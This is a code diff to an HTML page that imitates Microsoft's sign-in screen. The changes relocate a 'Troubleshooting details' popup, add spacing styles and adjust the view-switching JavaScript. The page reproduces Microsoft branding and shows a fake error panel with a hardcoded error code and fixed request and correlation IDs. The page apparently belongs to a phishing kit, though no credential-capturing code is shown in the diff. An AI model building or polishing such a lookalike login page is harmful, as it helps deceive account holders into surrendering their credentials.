@@ -150,7 +150,7 @@
         margin-left: 16px;
         text-decoration: none;
     }
-    /* Sign-in Options View Styles */
+    /* ✅ Sign-in Options View Styles */
     .signin-option-item {
         display: flex;
         align-items: flex-start;
@@ -207,28 +207,6 @@
         display: flex;
         justify-content: center;
     }
-    /* ✅ POPUP BOX STYLES */
-    .troubleshooting-box {
-        display: none;
-        background-color: #ffffff;
-        padding: 24px;
-        margin-top: 16px;
-        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        font-size: 14px;
-        color: #1b1b1b;
-    }
-    .troubleshooting-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: flex-start;
-    }
-    .troubleshooting-header h2 { margin: 0; font-size: 18px; font-weight: 600; }
-    .troubleshooting-close { font-size: 24px; font-weight: 200; border: none; background: none; cursor: pointer; }
-    .troubleshooting-body p { margin: 8px 0; }
-    .troubleshooting-body strong { font-weight: 600; }
-    .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
-    .troubleshooting-body a { color: #0067b8; text-decoration: none; }
-    .troubleshooting-body a:hover { text-decoration: underline; }
     .hidden { display: none !important; }
     .loading {
       text-align: center;
@@ -247,6 +225,10 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    .mt-4 { margin-top: 1rem; }
+    .mt-3 { margin-top: 0.75rem; }
+    .mt-2 { margin-top: 0.5rem; }
+    .form-group { margin-bottom: 1rem; }
   </style>
 </head>
 <body>
@@ -268,7 +250,7 @@
           </div>
         </div>
 
-        <!-- Sign-in Options View (div3) -->
+        <!-- ✅ Sign-in Options View (div3) -->
         <div id="div3" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <h1 class="mt-4">Sign-in options</h1>
@@ -318,6 +300,27 @@
             </p>
           </div>
         </div>
+
+        <!-- ✅ Troubleshooting Popup Box -->
+        <div class="troubleshooting-box" id="troubleshooting_box">
+          <div class="troubleshooting-header">
+              <h2>Troubleshooting details</h2>
+              <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
+          </div>
+          <div class="troubleshooting-body">
+              <p>If you contact your administrator, send this info to them.</p>
+              <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
+              <div id="error_details_for_copy">
+                  <p><strong>Error Code:</strong> 50058</p>
+                  <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
+                  <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
+                  <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
+              </div>
+              <hr>
+              <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
+              <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
+          </div>
+        </div>
       </div>
 
       <!-- "Sign-in options" Clickable Box -->
@@ -326,27 +329,6 @@
           <i class="fas fa-search"></i>
           <span>Sign-in options</span>
         </a>
-      </div>
-
-      <!-- ✅ POPUP BOX (Troubleshooting) -->
-      <div class="troubleshooting-box" id="troubleshooting_box">
-        <div class="troubleshooting-header">
-            <h2>Troubleshooting details</h2>
-            <button class="troubleshooting-close" id="close_troubleshooting_btn">&times;</button>
-        </div>
-        <div class="troubleshooting-body">
-            <p>If you contact your administrator, send this info to them.</p>
-            <p><a href="#" id="copy_info_link">Copy info to clipboard</a></p>
-            <div id="error_details_for_copy">
-                <p><strong>Error Code:</strong> 50058</p>
-                <p><strong>Request Id:</strong> <span class="code">a4d52b6b-cc92-4914-95ee-fe70b9bc0200</span></p>
-                <p><strong>Correlation Id:</strong> <span class="code">eaa8bc41-ac19-4850-9294-bc88a1f0e181</span></p>
-                <p><strong>Timestamp:</strong> <span class="code" id="modal_timestamp"></span></p>
-            </div>
-            <hr>
-            <p><strong>Flag sign-in errors for review:</strong> <a href="#">Enable flagging</a></p>
-            <p>If you plan on getting help for this problem, enable flagging and try to reproduce the error within 20 minutes. Flagged events make diagnostics available and are raised to admin attention.</p>
-        </div>
       </div>
     </div>
   </div>
@@ -445,7 +427,7 @@
             }, 1500);
         });
 
-        // Sign-in options card click - Show sign-in options view
+        // ✅ Sign-in options card click - Show sign-in options view
         optionsBox.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔍 Sign-in options clicked - Showing options');
@@ -453,9 +435,10 @@
             div2.classList.add('hidden');
             div3.classList.remove('hidden');
             optionsBox.classList.add('hidden');
+            troubleshootingBox.style.display = 'none';
         });
 
-        // Sign-in options link click - Show sign-in options view
+        // ✅ Sign-in options link click - Show sign-in options view
         signInOptionsLink.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔍 Sign-in options link clicked - Showing options');
@@ -463,9 +446,10 @@
             div2.classList.add('hidden');
             div3.classList.remove('hidden');
             optionsBox.classList.add('hidden');
+            troubleshootingBox.style.display = 'none';
         });
 
-        // Back button - Return to main sign-in view
+        // ✅ Back button - Return to main sign-in view
         backBtn.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('🔙 Back clicked - Returning to sign-in');
@@ -475,7 +459,7 @@
             optionsBox.classList.remove('hidden');
         });
 
-        // ✅ FOOTER DOTS BUTTON - Show troubleshooting popup
+        // ✅ Footer dots button - Show troubleshooting popup
         footerDotsLink.addEventListener('click', function (e) {
             e.preventDefault();
             console.log('📋 Footer dots clicked - Showing troubleshooting popup');
@@ -483,13 +467,13 @@
             troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
         });
 
-        // ✅ CLOSE TROUBLESHOOTING POPUP
+        // ✅ Close troubleshooting popup
         closeTroubleshootingBtn.addEventListener('click', function () {
             console.log('❌ Closing troubleshooting popup');
             troubleshootingBox.style.display = 'none';
         });
 
-        // ✅ COPY INFO TO CLIPBOARD
+        // ✅ Copy info to clipboard
         document.getElementById('copy_info_link').addEventListener('click', function (e) {
             e.preventDefault();
             const detailsNode = document.getElementById('error_details_for_copy');
